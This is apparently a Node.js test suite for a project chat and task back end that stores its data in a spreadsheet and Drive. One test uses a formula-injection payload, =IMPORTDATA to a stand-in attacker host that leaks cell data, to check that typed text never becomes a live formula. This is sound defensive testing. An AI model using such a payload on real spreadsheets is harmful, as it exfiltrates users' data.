import test from 'node:test';
import assert from 'node:assert/strict';
import { makeEnv, OWNER } from './fakes.mjs';

const MIN = 60 * 1000;

/**
 * A set-up back end: Tariq (admin, lead of project P), a lead, two members of P,
 * an outsider with a project of their own (Q), all approved.
 */
function ready() {
  const env = makeEnv();
  env.context.setup();
  const admin = env.token(OWNER);
  env.call('me', admin);
  const person = (email) => {
    const t = env.token(email);
    env.call('me', t);
    assert.equal(env.call('setUserStatus', admin, { email, status: 'approved' }).ok, true);
    return t;
  };
  const lead = person('lead@x.com');
  const bob = person('bob@x.com');
  const sara = person('sara@x.com');
  const out = person('out@x.com');
  const p = env.call('createProject', admin, { name: 'P' }).data;
  const q = env.call('createProject', admin, { name: 'Q' }).data;
  env.call('addMember', admin, { projectId: p.id, email: 'lead@x.com', role: 'lead' });
  env.call('addMember', admin, { projectId: p.id, email: 'bob@x.com' });
  env.call('addMember', admin, { projectId: p.id, email: 'sara@x.com' });
  env.call('addMember', admin, { projectId: q.id, email: 'out@x.com' });
  return { ...env, admin, lead, bob, sara, out, p, q };
}

const ok = (res) => { assert.equal(res.ok, true, JSON.stringify(res)); return res.data; };
const b64 = (s) => Buffer.from(s).toString('base64');

// ---------------------------------------------------------------- messages

test('members post messages with replies and @mentions; mentions keep only project members', () => {
  const env = ready();
  const m1 = ok(env.call('postMessage', env.bob, { projectId: env.p.id, text: '  Pump 3 is leaking  ' }));
  assert.deepEqual([m1.text, m1.authorEmail, m1.kind, m1.deleted], ['Pump 3 is leaking', 'bob@x.com', 'text', false]);

  const m2 = ok(env.call('postMessage', env.sara, {
    projectId: env.p.id, text: '@bob on it', replyToId: m1.id,
    mentions: ['BOB@x.com', 'bob@x.com', 'out@x.com', 'nobody@x.com']
  }));
  assert.equal(m2.replyToId, m1.id);
  assert.deepEqual(m2.mentions, ['bob@x.com'], 'outsiders and duplicates are dropped');
  assert.equal(env.rows('messages')[1].mentions, 'bob@x.com');
  assert.equal(typeof env.rows('messages')[1].createdAt, 'string', 'stored as plain text');
});

test('messages are checked: who, what, and where', () => {
  const env = ready();
  const pid = env.p.id;
  assert.equal(env.call('postMessage', env.out, { projectId: pid, text: 'hi' }).code, 'NOT_FOUND', 'outsiders cannot post');
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: '   ' }).code, 'BAD_REQUEST');
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: 'x'.repeat(4001) }).code, 'BAD_REQUEST');
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: 'hi', mentions: 'bob@x.com' }).code, 'BAD_REQUEST');

  const inQ = ok(env.call('postMessage', env.out, { projectId: env.q.id, text: 'secret' }));
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: 'hi', replyToId: inQ.id }).code, 'NOT_FOUND',
    'cannot reply to a message from another project');
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: 'hi', taskId: 'nope' }).code, 'NOT_FOUND');

  ok(env.call('postMessage', env.admin, { projectId: pid, text: 'admins can post without being a member row' }));
  env.call('archiveProject', env.admin, { projectId: pid });
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: 'hi' }).code, 'BAD_REQUEST', 'archived projects are read-only');
});

test('typed text can never become a live formula in the Sheet, and comes back exactly as typed', () => {
  const env = ready();
  const evil = '=IMPORTDATA("https://evil.example/?"&A1)';
  const typed = [evil, '+1+1', '- first point', "'=quoted", '​=already marked', 'plain'];
  for (const text of typed) {
    const m = ok(env.call('postMessage', env.bob, { projectId: env.p.id, text }));
    assert.equal(m.text, text);
  }
  const cells = env.rows('messages').map((r) => r.text);
  assert.ok(cells.every((c) => typeof c === 'string'), 'no cell was turned into a formula');
  assert.equal(cells[0], '​' + evil);
  assert.equal(cells.at(-1), 'plain', 'ordinary text is stored untouched');
  const synced = ok(env.call('sync', env.sara, { projectId: env.p.id })).messages.map((m) => m.text);
  assert.deepEqual(synced, typed);

  ok(env.call('createTask', env.bob, { projectId: env.p.id, title: '=HYPERLINK("x")' }));
  assert.equal(typeof env.rows('tasks')[0].title, 'string');
});

test('only the author (or an admin) edits or deletes; deleted messages are hidden but kept in the Sheet', () => {
  const env = ready();
  const pid = env.p.id;
  const m = ok(env.call('postMessage', env.bob, { projectId: pid, text: 'draft' }));
  assert.equal(env.call('editMessage', env.sara, { projectId: pid, messageId: m.id, text: 'hack' }).code, 'FORBIDDEN');
  assert.equal(env.call('editMessage', env.lead, { projectId: pid, messageId: m.id, text: 'hack' }).code, 'FORBIDDEN',
    'a lead is not an admin');
  assert.equal(env.call('deleteMessage', env.sara, { projectId: pid, messageId: m.id }).code, 'FORBIDDEN');
  assert.equal(env.call('editMessage', env.bob, { projectId: pid, messageId: m.id, text: '' }).code, 'BAD_REQUEST');

  const edited = ok(env.call('editMessage', env.bob, { projectId: pid, messageId: m.id, text: 'final', mentions: ['sara@x.com'] }));
  assert.equal(edited.text, 'final');
  assert.deepEqual(edited.mentions, ['sara@x.com']);
  assert.ok(edited.editedAt >= edited.createdAt && edited.editedAt);

  const gone = ok(env.call('deleteMessage', env.admin, { projectId: pid, messageId: m.id }));
  assert.deepEqual([gone.deleted, gone.text, gone.mentions], [true, '', []]);
  assert.equal(env.rows('messages')[0].text, 'final', 'kept in the Sheet for the record');
  assert.equal(env.rows('messages')[0].deleted, 'TRUE');
  assert.equal(env.call('editMessage', env.bob, { projectId: pid, messageId: m.id, text: 'back' }).code, 'NOT_FOUND');
  assert.equal(env.call('deleteMessage', env.bob, { projectId: pid, messageId: m.id }).code, 'NOT_FOUND');
  assert.equal(env.call('listProjects', env.sara).data[0].unread, 0, 'deleted messages are not unread');
});

// ---------------------------------------------------------------- tasks

test('tasks get a per-project serial and post a "created" line in the chat', () => {
  const env = ready();
  const t1 = ok(env.call('createTask', env.bob, {
    projectId: env.p.id, title: 'Replace gasket', assigneeEmail: 'SARA@x.com', dueDate: '2026-10-20', priority: 'high'
  }));
  assert.deepEqual([t1.serial, t1.status, t1.percent, t1.priority, t1.assigneeEmail, t1.createdBy, t1.doneAt],
    ['T-001', 'todo', 0, 'high', 'sara@x.com', 'bob@x.com', '']);
  assert.equal(ok(env.call('createTask', env.sara, { projectId: env.p.id, title: 'Second' })).serial, 'T-002');
  assert.equal(ok(env.call('createTask', env.out, { projectId: env.q.id, title: 'Other project' })).serial, 'T-001');
  assert.equal(env.rows('meta').find((r) => r.key === `taskSerial:${env.p.id}`).value, '2');

  const line = ok(env.call('sync', env.lead, { projectId: env.p.id })).messages[0];
  assert.equal(line.kind, 'event');
  assert.equal(line.text, '', 'the app words event lines itself');
  assert.deepEqual(line.event, { type: 'taskCreated', serial: 'T-001', title: 'Replace gasket', assigneeEmail: 'sara@x.com', status: 'todo', dueDate: '2026-10-20' });
  assert.deepEqual(line.mentions, ['sara@x.com'], 'the assignee is mentioned');
  assert.equal(line.taskId, t1.id);
  assert.equal(env.call('editMessage', env.bob, { projectId: env.p.id, messageId: line.id, text: 'x' }).code, 'FORBIDDEN');
  assert.equal(env.call('deleteMessage', env.bob, { projectId: env.p.id, messageId: line.id }).code, 'FORBIDDEN');
});

test('task input is checked', () => {
  const env = ready();
  const pid = env.p.id;
  const bad = [
    { title: '' },
    { title: 'x'.repeat(201) },
    { title: 'T', assigneeEmail: 'out@x.com' },
    { title: 'T', status: 'finished' },
    { title: 'T', priority: 'urgent' },
    { title: 'T', percent: 101 },
    { title: 'T', percent: '50' },
    { title: 'T', dueDate: '2026-02-30' },
    { title: 'T', dueDate: '20/10/2026' }
  ];
  for (const args of bad) assert.equal(env.call('createTask', env.bob, { projectId: pid, ...args }).code, 'BAD_REQUEST', JSON.stringify(args));
  assert.equal(env.call('createTask', env.out, { projectId: pid, title: 'T' }).code, 'NOT_FOUND');
  assert.equal(env.rows('tasks').length, 0);
  assert.equal(env.rows('meta').length, 1, 'no serial was used up by a refused task');
});

test('a chat message can be turned into a task; the "created" line replies to it', () => {
  const env = ready();
  const m = ok(env.call('postMessage', env.sara, { projectId: env.p.id, text: 'Someone check valve V-12' }));
  const t = ok(env.call('createTask', env.lead, { projectId: env.p.id, title: 'Check V-12', fromMessageId: m.id, assigneeEmail: 'bob@x.com' }));
  const line = ok(env.call('sync', env.bob, { projectId: env.p.id })).messages.find((x) => x.kind === 'event');
  assert.equal(line.replyToId, m.id);
  assert.equal(line.taskId, t.id);
  env.call('deleteMessage', env.sara, { projectId: env.p.id, messageId: m.id });
  assert.equal(env.call('createTask', env.lead, { projectId: env.p.id, title: 'x', fromMessageId: m.id }).code, 'NOT_FOUND');
});

test('who may change a task: assignee, creator, lead, admin — not other members', () => {
  const env = ready();
  const pid = env.p.id;
  const t = ok(env.call('createTask', env.lead, { projectId: pid, title: 'T', assigneeEmail: 'bob@x.com' }));
  assert.equal(env.call('updateTask', env.sara, { projectId: pid, taskId: t.id, percent: 50 }).code, 'FORBIDDEN');
  assert.equal(env.call('updateTask', env.out, { projectId: pid, taskId: t.id, percent: 50 }).code, 'NOT_FOUND');
  assert.equal(ok(env.call('updateTask', env.bob, { projectId: pid, taskId: t.id, percent: 40 })).percent, 40);
  assert.equal(ok(env.call('updateTask', env.lead, { projectId: pid, taskId: t.id, percent: 50 })).percent, 50);
  assert.equal(ok(env.call('updateTask', env.admin, { projectId: pid, taskId: t.id, percent: 60 })).percent, 60);
  const mine = ok(env.call('createTask', env.sara, { projectId: pid, title: 'Mine', assigneeEmail: 'bob@x.com' }));
  assert.equal(ok(env.call('updateTask', env.sara, { projectId: pid, taskId: mine.id, status: 'doing' })).status, 'doing');
  assert.equal(env.call('updateTask', env.bob, { projectId: env.q.id, taskId: t.id, percent: 1 }).code, 'NOT_FOUND');
});

test('done sets 100% and the finish time; reopening clears it; status/progress/assignee changes post a line', () => {
  const env = ready();
  const pid = env.p.id;
  const t = ok(env.call('createTask', env.lead, { projectId: pid, title: 'T', assigneeEmail: 'bob@x.com' }));
  const events = () => ok(env.call('sync', env.lead, { projectId: pid })).messages.filter((m) => m.kind === 'event');

  env.clock.advance(MIN);
  const done = ok(env.call('updateTask', env.bob, { projectId: pid, taskId: t.id, status: 'done' }));
  assert.deepEqual([done.status, done.percent], ['done', 100]);
  assert.ok(done.doneAt && done.updatedAt > t.updatedAt);
  assert.deepEqual(events().at(-1).event.changes, { status: { from: 'todo', to: 'done' }, percent: { from: 0, to: 100 } });

  const reopened = ok(env.call('updateTask', env.bob, { projectId: pid, taskId: t.id, status: 'doing', percent: 80 }));
  assert.deepEqual([reopened.status, reopened.percent, reopened.doneAt], ['doing', 80, '']);

  ok(env.call('updateTask', env.lead, { projectId: pid, taskId: t.id, assigneeEmail: 'sara@x.com' }));
  const last = events().at(-1);
  assert.deepEqual(last.event.changes, { assigneeEmail: { from: 'bob@x.com', to: 'sara@x.com' } });
  assert.deepEqual(last.mentions, ['sara@x.com'], 'the new assignee is told');

  const before = events().length;
  ok(env.call('updateTask', env.lead, { projectId: pid, taskId: t.id, title: 'Better title', dueDate: '2026-11-01' }));
  ok(env.call('updateTask', env.lead, { projectId: pid, taskId: t.id, percent: 80 }));
  assert.equal(events().length, before, 'wording edits and no-op changes stay out of the chat');

  const cleared = ok(env.call('updateTask', env.lead, { projectId: pid, taskId: t.id, assigneeEmail: '', dueDate: '' }));
  assert.deepEqual([cleared.assigneeEmail, cleared.dueDate], ['', '']);
});

// ---------------------------------------------------------------- daily updates

test('one daily update per person per day; posting again replaces it', () => {
  const env = ready();
  const pid = env.p.id;
  const task = ok(env.call('createTask', env.bob, { projectId: pid, title: 'T' }));
  const first = ok(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'Cleaned tank', taskIds: [task.id] }));
  assert.deepEqual([first.done, first.remaining, first.taskIds, first.authorEmail], ['Cleaned tank', '', [task.id], 'bob@x.com']);

  env.clock.advance(MIN);
  const again = ok(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'Cleaned tank', remaining: 'Paint' }));
  assert.equal(again.id, first.id);
  assert.equal(again.remaining, 'Paint');
  assert.ok(again.updatedAt > first.updatedAt);
  assert.equal(env.rows('updates').length, 1);

  ok(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-08', blockers: 'No crane' }));
  ok(env.call('postUpdate', env.sara, { projectId: pid, date: '2026-10-09', done: 'Inspection' }));
  assert.equal(env.rows('updates').length, 3);
});

test('daily updates are checked', () => {
  const env = ready();
  const pid = env.p.id;
  const otherTask = ok(env.call('createTask', env.out, { projectId: env.q.id, title: 'Q task' }));
  const future = new Date(Date.now() + 3 * 86400000).toISOString().slice(0, 10);
  assert.equal(env.call('postUpdate', env.bob, { projectId: pid, date: future, done: 'x' }).code, 'BAD_REQUEST');
  assert.equal(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09' }).code, 'BAD_REQUEST', 'something must be written');
  assert.equal(env.call('postUpdate', env.bob, { projectId: pid, done: 'x' }).code, 'BAD_REQUEST', 'date is required');
  assert.equal(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'x', taskIds: [otherTask.id] }).code, 'BAD_REQUEST');
  assert.equal(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'x', taskIds: Array(21).fill('a') }).code, 'BAD_REQUEST');
  assert.equal(env.call('postUpdate', env.out, { projectId: pid, date: '2026-10-09', done: 'x' }).code, 'NOT_FOUND');
  assert.equal(env.rows('updates').length, 0);
});

// ---------------------------------------------------------------- files

test('an upload is saved in the project folder and can be attached to a message and an update', () => {
  const env = ready();
  const pid = env.p.id;
  const f = ok(env.call('uploadFile', env.bob, { projectId: pid, name: 'site/photo.jpg', mimeType: 'image/jpeg', data: 'data:image/jpeg;base64,' + b64('JPEGDATA') }));
  const saved = env.drive.files.get(f.id);
  assert.equal(saved.folder.id, env.p.folderId, 'in the project folder');
  assert.equal(saved.name, 'site-photo.jpg', 'no slashes in Drive names');
  assert.equal(Buffer.from(saved.bytes).toString(), 'JPEGDATA');
  assert.deepEqual([f.size, f.uploaderEmail, f.messageId], [8, 'bob@x.com', '']);
  assert.equal(f.thumbnailUrl, `https://drive.google.com/thumbnail?id=${f.id}&sz=w800`);
  assert.equal(f.url, `https://drive.google.com/file/d/${f.id}/view`);

  const m = ok(env.call('postMessage', env.bob, { projectId: pid, fileIds: [f.id] }));
  assert.deepEqual([m.text, m.fileIds], ['', [f.id]], 'a photo with no text is fine');
  const u = ok(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'see photo', fileIds: [f.id] }));
  const row = env.rows('files')[0];
  assert.deepEqual([row.messageId, row.updateId], [m.id, u.id]);

  const pdf = ok(env.call('uploadFile', env.bob, { projectId: pid, name: 'report.pdf', mimeType: 'application/pdf', data: b64('%PDF') }));
  assert.equal(pdf.thumbnailUrl, '');
});

test('uploads are checked, and a file from another project cannot be attached', () => {
  const env = ready();
  const pid = env.p.id;
  const up = (t, args) => env.call('uploadFile', t, { projectId: pid, name: 'a.txt', mimeType: 'text/plain', data: b64('hi'), ...args });
  assert.equal(up(env.bob, { data: '' }).code, 'BAD_REQUEST');
  assert.equal(up(env.bob, { data: 'not base64!!' }).code, 'BAD_REQUEST');
  assert.equal(up(env.bob, { data: 'A'.repeat(20 * 1024 * 1024 + 4) }).code, 'BAD_REQUEST', 'over 20 MB of text');
  assert.equal(up(env.bob, { mimeType: 'text/html; x' }).code, 'BAD_REQUEST');
  assert.equal(up(env.bob, { name: '' }).code, 'BAD_REQUEST');
  assert.equal(up(env.out, {}).code, 'NOT_FOUND');
  assert.equal(env.drive.files.size, 0, 'nothing reached Drive');
  assert.equal(ok(up(env.bob, { mimeType: undefined })).mimeType, 'application/octet-stream');

  const qFile = ok(env.call('uploadFile', env.out, { projectId: env.q.id, name: 'q.txt', data: b64('q') }));
  assert.equal(env.call('postMessage', env.bob, { projectId: pid, text: 'look', fileIds: [qFile.id] }).code, 'BAD_REQUEST');
});

test('if the Sheet row cannot be written, the uploaded Drive file is thrown away', () => {
  const env = ready();
  env.lock.free = false;
  const res = env.call('uploadFile', env.bob, { projectId: env.p.id, name: 'a.txt', data: b64('hi') });
  assert.equal(res.code, 'BUSY');
  const [file] = [...env.drive.files.values()];
  assert.equal(file.trashed, true);
  assert.equal(env.rows('files').length, 0);
});

// ---------------------------------------------------------------- sync

test('sync: first call is a full picture, later calls only what changed (with a safety overlap)', () => {
  const env = ready();
  const pid = env.p.id;
  const old = ok(env.call('postMessage', env.bob, { projectId: pid, text: 'old' }));
  const task = ok(env.call('createTask', env.bob, { projectId: pid, title: 'T' }));
  ok(env.call('uploadFile', env.bob, { projectId: pid, name: 'a.txt', data: b64('a') }));
  ok(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'x' }));

  env.clock.advance(5 * MIN);
  const full = ok(env.call('sync', env.sara, { projectId: pid }));
  assert.equal(full.full, true);
  assert.deepEqual([full.messages.length, full.tasks.length, full.files.length, full.updates.length], [2, 1, 1, 1]);
  assert.equal(full.lastReadAt, '');

  env.clock.advance(5 * MIN);
  const quiet = ok(env.call('sync', env.sara, { projectId: pid, since: full.next }));
  assert.equal(quiet.full, false);
  assert.deepEqual([quiet.messages, quiet.tasks, quiet.files, quiet.updates], [[], [], [], []], 'nothing changed');

  const fresh = ok(env.call('postMessage', env.bob, { projectId: pid, text: 'new' }));
  ok(env.call('editMessage', env.bob, { projectId: pid, messageId: old.id, text: 'old (edited)' }));
  ok(env.call('updateTask', env.bob, { projectId: pid, taskId: task.id, percent: 30 }));
  ok(env.call('postUpdate', env.bob, { projectId: pid, date: '2026-10-09', done: 'x', remaining: 'y' }));
  env.clock.advance(5 * MIN);
  const delta = ok(env.call('sync', env.sara, { projectId: pid, since: quiet.next }));
  assert.deepEqual(delta.messages.map((m) => m.text).sort(), ['new', 'old (edited)', ''].sort(),
    'new message, the edit, and the progress line');
  assert.ok(delta.messages.some((m) => m.id === fresh.id));
  assert.deepEqual(delta.tasks.map((t) => t.percent), [30]);
  assert.deepEqual(delta.updates.map((u) => u.remaining), ['y']);

  ok(env.call('deleteMessage', env.bob, { projectId: pid, messageId: fresh.id }));
  const del = ok(env.call('sync', env.sara, { projectId: pid, since: delta.next }));
  assert.deepEqual(del.messages.map((m) => [m.id, m.deleted, m.text]), [[fresh.id, true, '']], 'the app learns about deletions');

  // A message saved 10 s before the cursor (e.g. while the previous sync was reading) is still sent.
  env.clock.advance(MIN);
  const late = ok(env.call('postMessage', env.bob, { projectId: pid, text: 'late' }));
  const cursor = new Date(Date.parse(late.createdAt) + 10000).toISOString();
  assert.deepEqual(ok(env.call('sync', env.sara, { projectId: pid, since: cursor })).messages.map((m) => m.text), ['late']);
});

test('sync is for members only, and checks its cursor', () => {
  const env = ready();
  assert.equal(env.call('sync', env.out, { projectId: env.p.id }).code, 'NOT_FOUND');
  assert.equal(env.call('sync', env.bob, { projectId: env.p.id, since: 'yesterday' }).code, 'BAD_REQUEST');
  assert.equal(env.call('sync', env.bob, { projectId: env.p.id, since: 12345 }).code, 'BAD_REQUEST');
  assert.equal(ok(env.call('sync', env.admin, { projectId: env.q.id })).full, true, 'admins see every project');
  env.call('archiveProject', env.admin, { projectId: env.p.id });
  assert.equal(env.call('sync', env.bob, { projectId: env.p.id }).ok, true, 'archived projects can still be read');
});

test('first sync sends the last 200 messages and 30 days of updates; older messages page in with listMessages', () => {
  const env = ready();
  const pid = env.p.id;
  // Write 230 messages and two old updates straight into the tabs.
  const msgs = env.ss.getSheetByName('messages');
  const at = (i) => new Date(Date.UTC(2026, 9, 1, 0, i)).toISOString();
  for (let i = 0; i < 230; i++) msgs.cells.push([`m${i}`, pid, 'bob@x.com', `#${i}`, '', '', '', '', at(i), '', '', '']);
  const today = new Date().toISOString().slice(0, 10);
  const longAgo = new Date(Date.now() - 40 * 86400000).toISOString().slice(0, 10);
  const upd = env.ss.getSheetByName('updates');
  upd.cells.push(['u1', pid, 'bob@x.com', longAgo, 'old', '', '', '', '', at(0), at(0)]);
  upd.cells.push(['u2', pid, 'bob@x.com', today, 'new', '', '', '', '', at(1), at(1)]);

  const full = ok(env.call('sync', env.sara, { projectId: pid }));
  assert.equal(full.messages.length, 200);
  assert.equal(full.hasMoreMessages, true);
  assert.deepEqual([full.messages[0].text, full.messages.at(-1).text], ['#30', '#229'], 'oldest first, newest last');
  assert.deepEqual(full.updates.map((u) => u.done), ['new']);

  const page = ok(env.call('listMessages', env.sara, { projectId: pid, before: full.messages[0].createdAt, limit: 20 }));
  assert.deepEqual([page.messages[0].text, page.messages.at(-1).text, page.hasMore], ['#10', '#29', true]);
  const last = ok(env.call('listMessages', env.sara, { projectId: pid, before: page.messages[0].createdAt }));
  assert.deepEqual([last.messages.length, last.hasMore], [10, false]);
  assert.equal(env.call('listMessages', env.sara, { projectId: pid, before: 'x' }).code, 'BAD_REQUEST');
  assert.equal(env.call('listMessages', env.sara, { projectId: pid, before: at(5), limit: 500 }).code, 'BAD_REQUEST');
  assert.equal(env.call('listMessages', env.out, { projectId: pid, before: at(5) }).code, 'NOT_FOUND');
});

// ---------------------------------------------------------------- reads

test('markRead clears the unread count and keeps one row per person per project', () => {
  const env = ready();
  const pid = env.p.id;
  ok(env.call('postMessage', env.bob, { projectId: pid, text: 'one' }));
  ok(env.call('postMessage', env.bob, { projectId: pid, text: 'two' }));
  const unread = () => env.call('listProjects', env.sara).data.find((x) => x.id === pid).unread;
  assert.equal(unread(), 2);

  env.clock.advance(1000);
  const r = ok(env.call('markRead', env.sara, { projectId: pid }));
  assert.equal(unread(), 0);
  assert.equal(ok(env.call('sync', env.sara, { projectId: pid })).lastReadAt, r.lastReadAt);

  env.clock.advance(1000);
  ok(env.call('postMessage', env.bob, { projectId: pid, text: 'three' }));
  assert.equal(unread(), 1);
  env.clock.advance(1000);
  ok(env.call('markRead', env.sara, { projectId: pid }));
  assert.equal(unread(), 0);
  assert.equal(env.rows('reads').filter((x) => x.email === 'sara@x.com').length, 1);
  assert.equal(env.call('markRead', env.out, { projectId: pid }).code, 'NOT_FOUND');
});
